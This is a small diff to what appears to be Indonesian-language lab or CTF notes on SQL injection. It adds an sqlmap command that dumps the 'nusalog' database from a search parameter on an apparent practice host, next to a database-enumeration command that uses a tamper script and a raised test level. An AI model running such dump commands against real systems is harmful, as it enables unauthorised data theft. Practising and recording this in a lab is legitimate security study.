@@ -203,6 +203,7 @@ sqlmap -u "http://labkamal.online:8085/search.php?q=test" \
 Perlu menaikkan temper dan level:
 ```
 sqlmap -u "http://labkamal.online:8096/search.php?q=a" --dbs --tamper=space2comment --level=2 --batch
+sqlmap -u "http://labkamal.online:8096/search.php?q=a" --tamper=space2comment --level=2 -D nusalog --dump 
 ```
 
 Flush session lama untuk target ini
